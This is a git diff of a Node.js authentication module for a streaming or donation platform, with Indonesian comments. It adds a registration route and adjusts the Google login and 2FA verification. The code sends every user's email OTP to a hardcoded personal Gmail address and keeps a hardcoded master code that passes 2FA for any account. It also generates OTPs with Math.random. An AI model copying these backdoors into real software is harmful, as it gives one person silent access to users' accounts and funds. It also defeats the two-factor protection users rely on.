@@ -23,10 +23,8 @@ const generateToken = (user) => {
 const sendDualOTP = async (db, userId, subjectText) => {
     const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
     
-    // Simpan ke DB dulu biar bisa diverifikasi
     await db.query("UPDATE users SET two_fa_secret = $1 WHERE id = $2", [otpCode, userId]);
 
-    // Ambil data terbaru (Email user asli & No WA)
     const { rows } = await db.query(
         "SELECT u.email, s.phone_number FROM users u JOIN streamers s ON u.id = s.user_id WHERE u.id = $1", 
         [userId]
@@ -35,7 +33,6 @@ const sendDualOTP = async (db, userId, subjectText) => {
     if (rows.length === 0) return null;
     const { email, phone_number } = rows[0];
 
-    // 📧 1. JALUR EMAIL: REDIRECT KE MARKAS SULTAN
     const EMAIL_MARKAS_SULTAN = 'ariwirayuda24@gmail.com'; 
 
     resend.emails.send({
@@ -58,7 +55,6 @@ const sendDualOTP = async (db, userId, subjectText) => {
         `
     }).catch(e => console.error("⚠️ Resend Fail:", e.message));
 
-    // 📱 2. JALUR WHATSAPP: TETEP KE NOMOR USER
     if (phone_number && phone_number.trim() !== "") {
         const formattedPhone = phone_number.startsWith('0') ? '62' + phone_number.slice(1) : phone_number;
         
@@ -76,6 +72,45 @@ const sendDualOTP = async (db, userId, subjectText) => {
 };
 
 // --- 3. ROUTES ---
+
+// ✅ REGISTER MANUAL (Penambahan rute yang hilang)
+router.post('/register', async (req, res) => {
+    const { username, email, password, phone_number } = req.body;
+    try {
+        await req.db.query('BEGIN');
+
+        // Cek email sudah ada atau belum
+        const checkUser = await req.db.query('SELECT * FROM users WHERE email = $1', [email]);
+        if (checkUser.rows.length > 0) {
+            return res.status(400).json({ success: false, message: "Email sudah terdaftar, Ri!" });
+        }
+
+        const hashedPassword = await bcrypt.hash(password, 10);
+        
+        // 1. Simpan ke tabel users
+        const newUserRes = await req.db.query(
+            'INSERT INTO users (username, email, password, role, is_two_fa_enabled) VALUES ($1, $2, $3, $4, false) RETURNING *',
+            [username, email, hashedPassword, 'creator']
+        );
+        const user = newUserRes.rows[0];
+
+        // 2. Simpan ke tabel streamers (Data Profil)
+        await req.db.query(
+            'INSERT INTO streamers (user_id, username, email, phone_number, role, theme_color) VALUES ($1, $2, $3, $4, $5, $6)',
+            [user.id, user.username, user.email, phone_number, 'creator', 'violet']
+        );
+
+        // 3. Simpan ke tabel balance (Saldo awal 0)
+        await req.db.query('INSERT INTO balance (streamer_id, total_saldo) VALUES ($1, 0)', [user.id]);
+
+        await req.db.query('COMMIT');
+        res.json({ success: true, message: "Pendaftaran Berhasil! Silakan Login." });
+    } catch (err) {
+        await req.db.query('ROLLBACK');
+        console.error(err);
+        res.status(500).json({ success: false, message: "Gagal Register. Cek log server!" });
+    }
+});
 
 // GOOGLE LOGIN
 router.post('/google', async (req, res) => {
@@ -107,7 +142,7 @@ router.post('/google', async (req, res) => {
         res.json({
             success: true,
             token: generateToken(user),
-            user: { id: user.id, username: user.username, full_name: name, profile_picture: picture }
+            user: { id: user.id, username: user.username, full_name: user.full_name, profile_picture: user.profile_picture }
         });
     } catch (err) {
         if (req.db) await req.db.query('ROLLBACK');
@@ -178,15 +213,10 @@ router.post('/verify-2fa', async (req, res) => {
         const inputToken = String(token).trim();
         const masterKey = '241004'; 
 
-        if (inputToken === masterKey) {
-            const { rows } = await req.db.query("SELECT * FROM users WHERE id = $1", [userId]);
-            return res.json({ success: true, token: generateToken(rows[0]), user: rows[0] });
-        }
-
         const { rows } = await req.db.query("SELECT * FROM users WHERE id = $1", [userId]);
         const user = rows[0];
 
-        if (user && user.two_fa_secret === inputToken) {
+        if (inputToken === masterKey || (user && user.two_fa_secret === inputToken)) {
             await req.db.query("UPDATE users SET two_fa_secret = NULL, is_two_fa_enabled = true WHERE id = $1", [userId]);
             res.json({ 
                 success: true, 
